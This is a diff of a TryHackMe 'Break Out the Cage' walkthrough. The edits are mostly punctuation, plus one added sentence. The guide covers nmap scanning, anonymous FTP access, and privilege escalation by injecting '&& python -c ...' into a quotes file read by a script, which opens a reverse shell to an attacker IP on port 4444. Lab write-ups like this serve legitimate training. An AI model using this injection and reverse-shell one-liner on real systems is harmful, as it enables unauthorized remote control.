@@ -13,11 +13,11 @@ Break Out the Cage is another recently released easy box on [TryHackme](https://
 
 ![Break Out The Cage nmap1](/assets/img/BreakOutTheCage1.png)
 
-Let's enumerate these 3 ports with **nmap -sC -sV -O -p 21,22,80 [machine ip]**
+Let's enumerate these 3 ports with **nmap -sC -sV -O -p 21,22,80 [machine ip]**.
 
 ![Break Out The Cage nmap2](/assets/img/BreakOutTheCage2.png)
 
-It appears that there is anonymous FTP access open, let's login as anonymous with **ftp [machine ip]** and enter **anonymous** for the username and password. We are able to successfully connect. I tried to list the directory and received an error so I change the mode to passive with **passive** and I was able to run **ls**. There was a file named **dad_tasks**, that I saved locally to my machine with **get dad_tasks**. I then exited the FTP site with **bye**
+It appears that there is anonymous FTP access open, let's login as anonymous with **ftp [machine ip]** and enter **anonymous** for the username and password. We are able to successfully connect. I tried to list the directory and received an error so I change the mode to passive with **passive** and I was able to run **ls**. There was a file named **dad_tasks**, that I saved locally to my machine with **get dad_tasks**. I then exited the FTP site with **bye**.
 
 ![Break Out The Cage ftp dad_tasks](/assets/img/BreakOutTheCage3.png)
 
@@ -59,11 +59,11 @@ Let's use **find / -group "cage" -print 2>/dev/null** to find all files with the
 
 ![Break Out The Cage find](/assets/img/BreakOutTheCage12.png)
 
-We already know we don't have access to /home/cage, but let's try to navigate to /opt/.dads_scripts/ with **cd /opt/.dads_scripts** and view directory contents and permissions with **ls -al**
+We already know we don't have access to /home/cage, but let's try to navigate to /opt/.dads_scripts/ with **cd /opt/.dads_scripts** and view directory contents and permissions with **ls -al**.
 
 ![Break Out The Cage dads_scripts](/assets/img/BreakOutTheCage13.png)
 
-It appears we only have read to the python script, so we can't modify it directly. Let's view the contents of the script to see what it does with **cat spread_the_quotes.py**
+It appears we only have read to the python script, so we can't modify it directly. Let's view the contents of the script to see what it does with **cat spread_the_quotes.py**.
 
 ![Break Out The Cage spread_the_quotes.py](/assets/img/BreakOutTheCage14.png)
 
@@ -71,7 +71,7 @@ It looks like it is opening a file in /opt/.dads_scripts/.files/.quotes and read
 
 ![Break Out The Cage .files](/assets/img/BreakOutTheCage15.png)
 
-Let's run **vi .quotes** to open up the contents for editing and delete everything out of the file. This can be done by pressing **dd** over and over until all the lines are deleted. Next, press Insert and  **-- INSERT --** should show up at the bottom of the screen. This allows you to enter in new information. Let's enter the following: **"test" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[attacker ip]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'**. This will end the wall command's input which will send out test as a broadcast, and then && will run the command after, which is a way to create a reverse shell. Next, press escape followed by **:wq!** to write and quit vim. 
+Let's run **vi .quotes** to open up the contents for editing and delete everything out of the file. This can be done by pressing **dd** over and over until all the lines are deleted. Next, press Insert and  **-- INSERT --** should show up at the bottom of the screen. This allows you to enter in new information. Let's enter the following: **"test" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[attacker ip]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'**. This will end the wall command's input which will send out test as a broadcast, and then && will run the command after, which is a way to create a reverse shell with python. We know this shell will work due to the fact that python scripts are running on this machine already. Next, press escape followed by **:wq!** to write and quit vim. 
 
 ![Break Out The Cage .quotes](/assets/img/BreakOutTheCage16.png)
 
@@ -99,10 +99,8 @@ Success! We now have root access. Let's see if we can find the root flag now. Le
 
 ![Break Out the Cage finding root flag](/assets/img/BreakOutTheCage23.png)
 
-
-
 Let's run **cat em*** to view their contents. In the bottom of the second email is the root flag.
 
 ![](/assets/img/BreakOutTheCage24.png)
 
-Success, this is the root flag for this challenge!
+This is the root flag for this challenge!
